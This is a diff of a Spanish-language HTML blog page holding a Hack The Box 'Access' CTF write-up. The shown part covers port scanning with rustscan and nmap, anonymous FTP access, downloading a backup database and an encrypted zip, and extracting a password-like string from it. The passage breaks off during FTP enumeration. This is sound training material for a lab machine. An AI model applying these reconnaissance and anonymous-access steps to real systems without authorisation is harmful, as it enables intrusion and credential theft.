@@ -1,161 +1,239 @@
 <!doctype html>
-<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <title>Bajo el Teclado</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="" />
+<html lang="es">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/pointed.png" />
+
+<title>Hack The Box: Access Writeup | Easy&nbsp;|&nbsp;Bajo el Teclado</title>
+<meta
+  name="title"
+  content="Hack The Box: Access Writeup | Easy"
+/>
+<meta
+  name="description"
+  content="Hack The Box: Access Writeup
+Welcome to my detailed writeup of the easy difficulty machine &ldquo;Access&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration
+
+
+
+
+
+
+1$ rustscan -a 10.129.222.164 --ulimit 5000 -g
+210.129.222.164 -&gt; [21,23,80]
+
+
+
+
+
+
+ 1$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts
+ 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:04 CEST
+ 3Nmap scan report for 10.129.22.164
+ 4Host is up.
+ 5
+ 6PORT   STATE    SERVICE VERSION
+ 721/tcp filtered ftp
+ 823/tcp filtered telnet
+ 980/tcp filtered http
+10
+11Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+12Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
+Los puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás."
+/>
+<meta
+  name="keywords"
+  content="HackTheBox,Access,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,Exploit,Windows,FTP Enumeration (using binary mode),PST Files (pst-utils),MDB Files (mdbtools),Bypassing anti-executable GPO,Abusing cached credentials,"
+/>
+
+  <meta name="author" content="Andrés Del Cerro" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/writeups/access---hackthebox/">
+  <meta property="og:site_name" content="Bajo el Teclado">
+  <meta property="og:title" content="Hack The Box: Access Writeup | Easy">
+  <meta property="og:description" content="Hack The Box: Access Writeup Welcome to my detailed writeup of the easy difficulty machine “Access” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.222.164 --ulimit 5000 -g 210.129.222.164 -&gt; [21,23,80]1$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:04 CEST 3Nmap scan report for 10.129.22.164 4Host is up. 5 6PORT STATE SERVICE VERSION 721/tcp filtered ftp 823/tcp filtered telnet 980/tcp filtered http 10 11Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 12Nmap done: 1 IP address (1 host up) scanned in 8.47 secondsLos puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-08-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-01T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Access">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Penetration Testing">
+    <meta property="article:tag" content="CTF">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack The Box: Access Writeup | Easy">
+  <meta name="twitter:description" content="Hack The Box: Access Writeup Welcome to my detailed writeup of the easy difficulty machine “Access” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.222.164 --ulimit 5000 -g 210.129.222.164 -&gt; [21,23,80]1$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:04 CEST 3Nmap scan report for 10.129.22.164 4Host is up. 5 6PORT STATE SERVICE VERSION 721/tcp filtered ftp 823/tcp filtered telnet 980/tcp filtered http 10 11Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 12Nmap done: 1 IP address (1 host up) scanned in 8.47 secondsLos puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás.">
+
+
+
+
+
+  <meta itemprop="name" content="Hack The Box: Access Writeup | Easy">
+  <meta itemprop="description" content="Hack The Box: Access Writeup Welcome to my detailed writeup of the easy difficulty machine “Access” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.222.164 --ulimit 5000 -g 210.129.222.164 -&gt; [21,23,80]1$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:04 CEST 3Nmap scan report for 10.129.22.164 4Host is up. 5 6PORT STATE SERVICE VERSION 721/tcp filtered ftp 823/tcp filtered telnet 980/tcp filtered http 10 11Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 12Nmap done: 1 IP address (1 host up) scanned in 8.47 secondsLos puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás.">
+  <meta itemprop="datePublished" content="2024-08-01T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-08-01T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1524">
+  <meta itemprop="keywords" content="HackTheBox,Access,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,Exploit,Windows,FTP Enumeration (Using Binary Mode),PST Files (Pst-Utils),MDB Files (Mdbtools),Bypassing Anti-Executable GPO,Abusing Cached Credentials">
+<meta name="referrer" content="no-referrer-when-downgrade" />
 
     
-    
-    
-    <link rel="stylesheet" href="../../css/theme.min.css">
+    <link href="/simple.min.css" rel="stylesheet" />
 
     
-    
+    <link href="/style.min.css" rel="stylesheet" />
+
     
 
     
-  
-
-
 </head>
-<body>
-        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
-    <div class="row">
-        
-        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
-            <a href="../../" class="text-decoration-none">
-                <img id="home-image" class="rounded-circle"
-                    
-                        
-                            src="../../pointed.jpeg"
-                        
-                    
-                />
-            </a>
-        </div>
-        <div class="col-sm-8 col-12 text-sm-left text-center">
-        
-            <h2 class="m-0 mb-2 mt-4">
-                <a href="../../" class="text-decoration-none">
-                    
-                        pointedsec
-                    
-                </a>
-            </h2>
-            <p class="text-muted mb-1">
-                
-                    if pentester.found == bug { make(pentester,states.happy) }
-                
-            </p>
-            <ul id="nav-links" class="list-inline mb-2">
-                
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../about/" title="About">About</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
-                    </li>
-                
-            </ul>
-            <ul id="nav-social" class="list-inline">
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="http://github.com/pointedsec" target="_blank">
-                            <i class="fab fa-github fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
-                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
-                            <i class="fas fa-at fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://pointedsec.vercel.app" target="_blank">
-                            <i class="fas fa-globe fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
-                            <i class="fas fa-box fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-    <hr />
-</header>
-<div class="container">
-    <div class="pl-sm-4 ml-sm-5">
-        <h1 id="hack-the-box-access-writeup">Hack The Box: Access Writeup</h1>
+
+  <body>
+    <header>
+      <nav>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ZHDKLM7DD2');
+</script>
+
+
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/about/"
+    
+    >About me</a
+  >
+
+  <a
+    href="/writeups/"
+    
+    >Writeup&#39;s</a
+  >
+
+
+</nav>
+<div style="display: flex; justify-content: center; align-items: center">
+  <div style="display: flex; width: 20rem; gap: 2rem;">
+    <img src="yo.png" alt="">
+    <h1>Hack The Box: Access Writeup | Easy</h1>
+  </div>
+</div>
+
+
+    </header>
+    <main>
+      
+  
+  
+  <content>
+    <h1 id="hack-the-box-access-writeup">Hack The Box: Access Writeup</h1>
 <p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Access&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
 <h1 id="tcp-enumeration">TCP Enumeration</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.222.164 --ulimit <span style="color:#ae81ff">5000</span> -g
-</span></span><span style="display:flex;"><span>10.129.222.164 -&gt; <span style="color:#f92672">[</span>21,23,80<span style="color:#f92672">]</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-01 21:04 CEST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.22.164
-</span></span><span style="display:flex;"><span>Host is up.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE VERSION
-</span></span><span style="display:flex;"><span>21/tcp filtered ftp
-</span></span><span style="display:flex;"><span>23/tcp filtered telnet
-</span></span><span style="display:flex;"><span>80/tcp filtered http
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.47 seconds
-</span></span></code></pre></div><p>Los puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.222.164 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.222.164 -&gt; [21,23,80]</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p21,23,80 -sCV 10.129.22.164 -Pn -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:04 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.22.164
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT   STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>21/tcp filtered ftp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>23/tcp filtered telnet
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>80/tcp filtered http
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 8.47 seconds</span></span></code></pre></div>
+<p>Los puertos aparecen como filtered, pero nos podemos hacer una idea de que servicios hay detrás.</p>
 <h1 id="udp-enumeration">UDP Enumeration</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.22.164 -oN allPorts.UDP
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-01 21:06 CEST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.22.164
-</span></span><span style="display:flex;"><span>Host is up.
-</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1500</span> scanned ports on 10.129.22.164 are in ignored states.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1500</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.42 seconds
-</span></span></code></pre></div><h1 id="ftp-enumeration">FTP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.22.164 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 21:06 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.22.164
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>All <span style="color:#ff0;font-weight:bold">1500</span> scanned ports on 10.129.22.164 are in ignored states.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1500</span> open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 2.42 seconds</span></span></code></pre></div>
+<h1 id="ftp-enumeration">FTP Enumeration</h1>
 <p>Parece que podemos acceder al FTP de forma anónima.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ftp 10.129.222.164
-</span></span><span style="display:flex;"><span>Connected to 10.129.222.164.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
-</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.222.164:pointedsec<span style="color:#f92672">)</span>: anonymous
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
-</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
-</span></span><span style="display:flex;"><span>ftp&gt; dir
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">425</span> Cannot open data connection.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> PORT command successful.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>08-23-18  09:16PM       &lt;DIR&gt;          Backups
-</span></span><span style="display:flex;"><span>08-24-18  10:00PM       &lt;DIR&gt;          Engineer
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span>ftp&gt; 
-</span></span></code></pre></div><p>Dentro del directorio <code>Backups</code> vemos un archivo <code>backup.mdb</code> y dentro del directorio <code>Engineer</code> vemos el archivo <code>Access Control.zip</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ftp 10.129.222.164
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Connected to 10.129.222.164.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#ff0;font-weight:bold">220</span> Microsoft FTP Service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Name (10.129.222.164:pointedsec): anonymous
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#ff0;font-weight:bold">331</span> Anonymous access allowed, send identity (e-mail name) as password.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#ff0;font-weight:bold">230</span> User logged in.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Remote system <span style="color:#fff;font-weight:bold">type</span> is Windows_NT.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>ftp&gt; dir
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#ff0;font-weight:bold">425</span> Cannot open data connection.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#ff0;font-weight:bold">200</span> PORT <span style="color:#fff;font-weight:bold">command</span> successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#ff0;font-weight:bold">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>08-23-18  09:16PM       &lt;DIR&gt;          Backups
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>08-24-18  10:00PM       &lt;DIR&gt;          Engineer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span><span style="color:#ff0;font-weight:bold">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>ftp&gt; </span></span></code></pre></div>
+<p>Dentro del directorio <code>Backups</code> vemos un archivo <code>backup.mdb</code> y dentro del directorio <code>Engineer</code> vemos el archivo <code>Access Control.zip</code></p>
 <p>Al descargar los archivos me ha dado un error, pero parece que los archivos están íntegros, o al menos los magic numbers&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ file backup.mdb 
-</span></span><span style="display:flex;"><span>backup.mdb: Microsoft Access Database
-</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/access/content<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ file Access<span style="color:#ae81ff">\ </span>Control.zip 
-</span></span><span style="display:flex;"><span>Access Control.zip: Zip archive data, at least v2.0 to extract, compression method<span style="color:#f92672">=</span>AES Encrypted
-</span></span></code></pre></div><p>Haciendo un <code>strings backup.mdb</code> podemos sacar algunas cadenas de texto interesantes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ file backup.mdb 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>backup.mdb: Microsoft Access Database
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/access/content]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>└──╼ [★]$ file Access<span style="color:#0ff;font-weight:bold">\ </span>Control.zip 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted</span></span></code></pre></div>
+<p>Haciendo un <code>strings backup.mdb</code> podemos sacar algunas cadenas de texto interesantes.</p>
 <ul>
 <li>access4u@security</li>
 <li>backup_admin</li>
@@ -168,224 +246,350 @@
 <p>Después de fuzzear el servicio HTTP, no encontré nada,y el puerto <code>23</code> que supuestamente corresponde a telnet no me envía cabeceras ni nada por el estilo, así que volví a probar con el FTP a ver si era capaz de descargar los archivos íntegros ya que no lo estaban.</p>
 <h1 id="ftp-enumeration-again">FTP Enumeration (again)</h1>
 <p>Entonces intenté descargar los archivos en otro modo de transferencia ya que FTP permite el modo <code>binary</code> y el modo <code>ASCII (por defecto)</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ftp&gt; type binary
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> Type set to I.
-</span></span><span style="display:flex;"><span>ftp&gt; dir
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> PORT command successful.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>08-23-18  09:16PM              <span style="color:#ae81ff">5652480</span> backup.mdb
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span>ftp&gt; get backup.mdb
-</span></span><span style="display:flex;"><span>local: backup.mdb remote: backup.mdb
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> PORT command successful.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>100% |*********************************************|  <span style="color:#ae81ff">5520</span> KiB    2.28 MiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
-</span></span></code></pre></div><p>Y ahora sí que tengo los archivos íntegros.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>ftp&gt; <span style="color:#fff;font-weight:bold">type</span> binary
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#ff0;font-weight:bold">200</span> Type <span style="color:#fff;font-weight:bold">set</span> to I.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>ftp&gt; dir
